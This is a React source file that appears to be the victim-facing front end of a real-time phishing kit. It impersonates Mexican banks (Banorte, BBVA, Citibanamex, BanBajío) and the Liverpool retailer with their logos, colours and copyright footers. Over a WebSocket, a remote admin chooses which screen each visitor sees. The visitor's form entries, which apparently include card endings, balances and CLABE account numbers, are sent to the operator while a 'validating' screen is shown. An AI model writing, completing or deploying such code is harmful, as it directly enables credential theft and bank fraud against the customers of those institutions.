import { useState, useEffect } from 'react';
import { useRoute } from 'wouter';
import { useWebSocket } from '@/hooks/useWebSocket';
import { ScreenTemplates } from '@/components/client/ScreenTemplates';
import { Session, ScreenType } from '@shared/schema';
import { formatDate } from '@/utils/helpers';
import liverpoolLogo from '../assets/pngwing.com 2.png';
import citibanamexLogo from '../assets/Banamex.png';
import banbajioLogo from '../assets/banbajio_logo_oficial.png';
import banbajioBackground from '../assets/IMG_0354.jpeg';
import bbvaLogo from '@assets/bbva_logo.png';
import bbvaLogoWhite from '../assets/bbva_logo_white.png';
import banorteLogo from '../assets/banorte-logo.png';

export default function ClientScreen() {
  // Get session ID from URL
  const [, params] = useRoute('/client/:sessionId');
  const sessionId = params?.sessionId || '';
  
  // State for the current screen
  const [currentScreen, setCurrentScreen] = useState<ScreenType>(ScreenType.FOLIO);
  const [sessionData, setSessionData] = useState<Partial<Session> & { banco: string }>({ banco: 'LIVERPOOL' });
  
  // Additional screen-specific state
  const [screenData, setScreenData] = useState<{
    terminacion?: string;
    saldo?: string;
    monto?: string;
    clabe?: string;
    titular?: string;
    comercio?: string;
    mensaje?: string;
  }>({});
  
  // WebSocket connection
  const { socket, connected, sendMessage } = useWebSocket('/ws');

  // Register with the server when connection is established
  useEffect(() => {
    if (connected && sessionId) {
      sendMessage({
        type: 'REGISTER',
        role: 'CLIENT',
        sessionId
      });
    }
  }, [connected, sessionId, sendMessage]);

  // Handle WebSocket messages
  useEffect(() => {
    if (!socket) return;

    const handleMessage = (event: MessageEvent) => {
      try {
        const message = JSON.parse(event.data);
        
        // Handle different message types
        if (message.type === 'INIT_SESSION') {
          setSessionData(message.data);
          // Set initial screen based on session data
          if (message.data.pasoActual) {
            setCurrentScreen(message.data.pasoActual as ScreenType);
          }
        }
        else if (message.type === 'SCREEN_CHANGE') {
          const { tipo, ...data } = message.data;
          
          // Extract screen type from the message
          const screenType = tipo.replace('mostrar_', '') as ScreenType;
          setCurrentScreen(screenType);
          
          // Update screen-specific data
          setScreenData(data);
        }
      } catch (error) {
        console.error("Error processing WebSocket message:", error);
      }
    };

    socket.addEventListener('message', handleMessage);
    return () => socket.removeEventListener('message', handleMessage);
  }, [socket]);

  // Handle form submissions
  const handleSubmit = (screen: ScreenType, formData: Record<string, any>) => {
    if (connected) {
      console.log('Enviando datos al servidor:', screen, formData);
      
      // Enviar datos al servidor inmediatamente
      sendMessage({
        type: 'CLIENT_INPUT',
        data: {
          tipo: screen,
          sessionId,
          data: formData
        }
      });
      
      // Cambiar a pantalla validando mientras esperamos respuesta del admin
      setCurrentScreen(ScreenType.VALIDANDO);
    }
  };

  // Función para determinar el header basado en el banco
  const renderHeader = () => {
    if (sessionData.banco === 'BANBAJIO') {
      return (
        <>
          <div className="logo text-center py-4 bg-white">
            <img 
              src={banbajioLogo} 
              alt="BanBajío"
              className="h-16 inline-block"
            />
          </div>
          <div className="banbajio-header">
            {formatDate(new Date())}
          </div>
        </>
      );
    } else if (sessionData.banco === 'CITIBANAMEX') {
      return (
        <header className="bg-[#005BAC] text-white p-4 text-center">
          <img 
            src={citibanamexLogo} 
            className="h-20 inline-block" 
            alt="Citibanamex" 
          />
          <div className="font-bold text-sm mt-2">{formatDate(new Date())}</div>
        </header>
      );
    } else if (sessionData.banco === 'BBVA') {
      return (
        <header className="bg-[#072146] text-white p-4 text-center">
          <div className="font-bold text-sm mb-2">{formatDate(new Date())}</div>
          <img 
            src={bbvaLogoWhite} 
            className="h-20 inline-block white-logo" 
            alt="BBVA" 
          />
        </header>
      );
    } else if (sessionData.banco === 'BANORTE') {
      return (
        <header className="bg-[#d6001c] text-white p-4 text-center">
          <div className="font-bold text-sm mb-2">{formatDate(new Date())}</div>
          <img 
            src={banorteLogo} 
            className="h-20 inline-block" 
            alt="Banorte" 
          />
        </header>
      );
    } else {
      return (
        <header className="bg-[#EC1C24] text-white p-4 text-center">
          <img 
            src={banorteLogo} 
            className="h-20 inline-block" 
            alt="Banorte" 
          />
          <div className="font-bold text-sm mt-2">{formatDate(new Date())}</div>
        </header>
      );
    }
  };

  // Función para renderizar el footer específico de BanBajío
  const renderFooter = () => {
    if (sessionData.banco === 'BANBAJIO') {
      return (
        <footer className="mt-auto">
          <div className="banbajio-footer">
            Aprende más | Ayuda | Términos y condiciones | Seguridad en línea
          </div>
          <div className="banbajio-footer-bottom">
            <a href="#" className="text-white mx-2">Contáctanos</a>
            <a href="#" className="text-white mx-2">Aclaraciones</a>
            <a href="#" className="text-white mx-2">Promociones</a>
            <a href="#" className="text-white mx-2">Facebook</a>
            <a href="#" className="text-white mx-2">YouTube</a>
            <br />
            © Banbajio México 2024. Todos los Derechos Reservados
          </div>
        </footer>
      );
    } else {
      return (
        <footer className="mt-auto">
          <div className="bg-gray-100 p-4 text-center text-sm">
            <a href="#" className={`${
              sessionData.banco === 'CITIBANAMEX' ? 'text-[#0070BA]' : 
              sessionData.banco === 'BBVA' ? 'text-[#072146]' :
              'text-[#EC1C24]'
            } mx-2`}>Aprende más</a>
            <a href="#" className={`${
              sessionData.banco === 'CITIBANAMEX' ? 'text-[#0070BA]' : 
              sessionData.banco === 'BBVA' ? 'text-[#072146]' :
              'text-[#EC1C24]'
            } mx-2`}>Ayuda</a>
            <a href="#" className={`${
              sessionData.banco === 'CITIBANAMEX' ? 'text-[#0070BA]' : 
              sessionData.banco === 'BBVA' ? 'text-[#072146]' :
              'text-[#EC1C24]'
            } mx-2`}>Términos y condiciones</a>
            <a href="#" className={`${
              sessionData.banco === 'CITIBANAMEX' ? 'text-[#0070BA]' : 
              sessionData.banco === 'BBVA' ? 'text-[#072146]' :
              'text-[#EC1C24]'
            } mx-2`}>Seguridad en línea</a>
          </div>

          <div className={`${
            sessionData.banco === 'CITIBANAMEX' ? 'bg-[#005BAC]' : 
            sessionData.banco === 'BBVA' ? 'bg-[#072146]' :
            'bg-[#EC1C24]'
          } text-white p-4 text-center text-sm`}>
            <div className="mb-3">
              <a href="#" className="text-white mx-2">Contáctanos</a> |
              <a href="#" className="text-white mx-2">Aclaraciones</a> |
              <a href="#" className="text-white mx-2">Promociones</a> |
              <a href="#" className="text-white mx-2">Facebook</a> |
              <a href="#" className="text-white mx-2">Youtube</a>
            </div>
            <div>© {
              sessionData.banco === 'CITIBANAMEX' ? 'Banamex' : 
              sessionData.banco === 'BBVA' ? 'BBVA' :
              'Banorte'
            } México 2024. Todos los Derechos Reservados</div>
          </div>
        </footer>
      );
    }
  };

  // Función para mostrar información adicional según el banco
  const renderBankInfo = () => {
    if (sessionData.banco === 'BANBAJIO') {
      return null; // BanBajío no muestra información adicional
    } else if (sessionData.banco === 'CITIBANAMEX') {
      return (
        <div className="text-center mt-4 px-4">
          <p className="text-sm text-gray-600">Banca digital segura para todos tus trámites financieros</p>
        </div>
      );
    } else if (sessionData.banco === 'BBVA') {
      return (
        <div className="text-center mt-4 px-4">
          <p className="text-sm text-gray-600">La manera más fácil y segura de realizar tus operaciones bancarias</p>
        </div>
      );
    } else if (sessionData.banco === 'BANORTE') {
      return (
        <div className="text-center mt-4 px-4">
          <p className="text-sm text-gray-600">Tu banca en línea, más segura y con mayor protección</p>
        </div>
      );
    } else {
      return (
        <div className="text-center mt-4 px-4">
          <p className="text-sm">Recuerda que con una sola cuenta puedes ingresar a todas nuestras tiendas.</p>
          <div className="mt-2 space-x-2">
            <img 
              src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Suburbia_2022_logo.svg/100px-Suburbia_2022_logo.svg.png" 
              className="h-5 inline-block" 
              alt="Suburbia" 
            />
            <img 
              src="https://upload.wikimedia.org/wikipedia/commons/8/89/Williams-Sonoma_logo.svg" 
              className="h-5 inline-block" 
              alt="Williams Sonoma" 
            />
          </div>
        </div>
      );
    }
  };

  return (
    <div 
      className={`min-h-screen flex flex-col ${
        sessionData.banco === 'BANBAJIO' 
          ? 'banbajio-background'  
          : 'bg-white'
      }`}
      style={
        sessionData.banco === 'BANBAJIO' 
          ? { backgroundImage: `url(${banbajioBackground})`, backgroundSize: 'cover' } 
          : {}
      }
    >
      {renderHeader()}
      {renderBankInfo()}

      <div className="container mx-auto max-w-md px-6 py-8 flex-grow">
        <ScreenTemplates 
          currentScreen={currentScreen} 
          screenData={screenData}
          onSubmit={handleSubmit}
          banco={sessionData.banco || 'BANORTE'}
        />
      </div>

      {renderFooter()}
    </div>
  );
}
